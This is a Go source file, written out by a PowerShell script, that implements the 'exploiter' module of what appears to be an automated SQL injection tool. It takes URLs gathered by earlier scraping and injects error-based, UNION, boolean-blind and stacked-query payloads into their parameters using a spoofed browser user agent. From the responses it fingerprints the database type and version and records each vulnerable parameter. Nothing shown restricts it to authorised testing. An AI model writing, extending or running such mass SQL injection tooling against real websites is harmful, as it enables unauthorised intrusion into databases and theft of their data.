
Write-File (Join-Path (Join-Path $root "engine") "exploiter.go") @'
package engine

import (
"context"
"encoding/json"
"fmt"
"net/url"
"regexp"
"strings"
"sync/atomic"
)

// ExploitCfg: tecnicas/DBMS (vacio => config.json), intensidad, workers, tope.
type ExploitCfg struct {
Techniques TechCfg `json:"techniques"`
DBMS       DBMSCfg `json:"dbms"`
Heuristics *bool   `json:"heuristics"`
Intensity  int     `json:"intensity"`
Workers    int     `json:"workers"`
MaxURLs    int     `json:"maxUrls"`
}

var dbmsSigns = []struct {
name string
re   *regexp.Regexp
}{
{"mysql", regexp.MustCompile(`(?i)mysql|maria ?db`)},
{"mssql", regexp.MustCompile(`(?i)microsoft sql|sql server|oledb|odbc sql server|mssql|uncategorized provider`)},
{"postgresql", regexp.MustCompile(`(?i)postgres|npgsql|pgjdbc`)},
{"oracle", regexp.MustCompile(`(?i)oracle|ora-[0-9]{5}|quoted string not properly terminated`)},
}

var reVersion = regexp.MustCompile(`(?i)(?:mysql|maria ?db|sql server|postgresql|oracle)[\s\[\(]*([0-9][0-9a-z.\-]*)?`)

var errorPayloads = map[string]string{
"mysql":      `xqz' AND 1=convert(int,(select user()))`,
"mssql":      `xqz'; CAST((select current_user) AS int)`,
"postgresql": `xqz' AND 1=(select 1 from pg_class)`,
"oracle":     `xqz' AND 1=(select count(*) from dual)`,
}

var unionPayloads = map[string]string{
"mysql":      `xqz' UNION SELECT 1,2,3,4,5,6,7,8,9,10`,
"mssql":      `xqz' UNION SELECT 1,2,3,4,5,6,7,8,9,10`,
"postgresql": `xqz' UNION SELECT 1,2,3,4,5,6,7,8,9,10`,
"oracle":     `xqz' UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM dual`,
}

var commentSuffixes = []string{"-- ", "#", ""}

func detectDBMS(body string) (string, string) {
for _, s := range dbmsSigns {
if s.re.MatchString(body) {
ver := ""
if vm := reVersion.FindStringSubmatch(body); len(vm) > 1 && vm[1] != "" {
ver = vm[1]
}
return s.name, ver
}
}
return "", ""
}

func withParam(ru *url.URL, param, value string) string {
q := ru.Query()
q.Set(param, value)
probe := *ru
probe.RawQuery = q.Encode()
return probe.String()
}

func (e *Engine) addExploit(urlStr, param, technique, dbms, version, finding string) {
e.mu.Lock()
e.exploits = append(e.exploits, Exploit{
ID:        len(e.exploits),
URL:       urlStr,
Param:     param,
Technique: technique,
DBMS:      dbms,
Version:   version,
Finding:   finding,
})
e.mu.Unlock()
e.log("ok", fmt.Sprintf("exploit: %s en %s (param %s, %s)", technique, urlStr, param, dbms))
}

// StartExploit inyecta payloads SQLi en los parametros de las URLs (async).
func (e *Engine) StartExploit(cfg string) string {
var c ExploitCfg
if err := json.Unmarshal([]byte(cfg), &c); err != nil {
return marshal(Resp{OK: false, Error: err.Error()})
}
conf := e.cfg()
if c.Techniques == (TechCfg{}) {
c.Techniques = conf.Exploiter.Techniques
}
if c.DBMS == (DBMSCfg{}) {
c.DBMS = conf.Exploiter.DBMS
}
heur := conf.Exploiter.Heuristics
if c.Heuristics != nil {
heur = *c.Heuristics
}
if c.Intensity <= 0 {
c.Intensity = conf.Exploiter.Intensity
}
if c.Intensity < 1 {
c.Intensity = 1
}
if c.Intensity > 3 {
c.Intensity = 3
}
if c.Workers <= 0 {
c.Workers = conf.Core.Threads
}
if c.MaxURLs <= 0 {
c.MaxURLs = 200
}

e.mu.Lock()
e.exploits = nil
var targets []URLItem
for _, u := range e.urls {
if len(u.Params) == 0 {
continue
}
targets = append(targets, u)
if len(targets) >= c.MaxURLs {
break
}
}
e.mu.Unlock()
if len(targets) == 0 {
return marshal(Resp{OK: false, Error: "sin URLs con parametros: ejecuta Scrape primero"})
}

ctx := e.startJob("exploit", len(targets))
go func() {
defer e.endJob("exploit")
e.parallel(ctx, c.Workers, len(targets), func(ctx context.Context, i int) {
e.exploitURL(ctx, targets[i], c, heur)
atomic.AddInt64(&e.done, 1)
})
}()
return marshal(Resp{OK: true, Count: len(targets)})
}

func (e *Engine) exploitURL(ctx context.Context, u URLItem, c ExploitCfg, heur bool) {
ru, err := url.Parse(u.Raw)
if err != nil {
return
}
ua := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
paras := u.Params
if len(paras) > 3 {
paras = paras[:3]
}
suffixes := commentSuffixes[:c.Intensity]
dbmsOn := map[string]bool{
"mysql": c.DBMS.Mysql, "mssql": c.DBMS.Mssql,
"postgresql": c.DBMS.Postgresql, "oracle": c.DBMS.Oracle,
}
for _, p := range paras {
if ctx.Err() != nil {
return
}
for dbms, on := range dbmsOn {
if !on {
continue
}
if c.Techniques.Error {
for _, suf := range suffixes {
probe := withParam(ru, p, errorPayloads[dbms]+suf)
if status, body, ferr := e.fetch(ctx, probe, ua); ferr == nil {
e.markURL(u.ID, status)
if name, ver := detectDBMS(body); name != "" && (name == dbms || heur) {
e.addExploit(probe, p, "error", name, ver, "error de BD detectado en la respuesta")
break
}
}
}
}
if c.Techniques.Union {
for _, suf := range suffixes {
probe := withParam(ru, p, unionPayloads[dbms]+suf)
if status, body, ferr := e.fetch(ctx, probe, ua); ferr == nil {
e.markURL(u.ID, status)
if strings.Contains(body, "xqz") {
ver := ""
if _, v := detectDBMS(body); v != "" {
ver = v
}
e.addExploit(probe, p, "union", dbms, ver, "marcador reflejado en UNION SELECT")
break
}
}
}
}
}
if c.Techniques.Blind {
base := withParam(ru, p, `xqz' AND 1=1 -- `)
alt := withParam(ru, p, `xqz' AND 1=2 -- `)
if s1, b1, e1 := e.fetch(ctx, base, ua); e1 == nil {
if _, b2, e2 := e.fetch(ctx, alt, ua); e2 == nil {
e.markURL(u.ID, s1)
dif := len(b1) - len(b2)
if dif < 0 {
dif = -dif
}
if dif > 50 {
e.addExploit(base, p, "blind", "desconocido", "", "diferencia de longitud (boolean-based)")
}
}
}
}
if c.Techniques.Stacked {
probe := withParam(ru, p, `xqz'; SELECT 1 -- `)
if status, body, ferr := e.fetch(ctx, probe, ua); ferr == nil {
e.markURL(u.ID, status)
if strings.Contains(body, "xqz") {
e.addExploit(probe, p, "stacked", "desconocido", "", "marcador reflejado con queries apiladas")
}
}
}
}
}
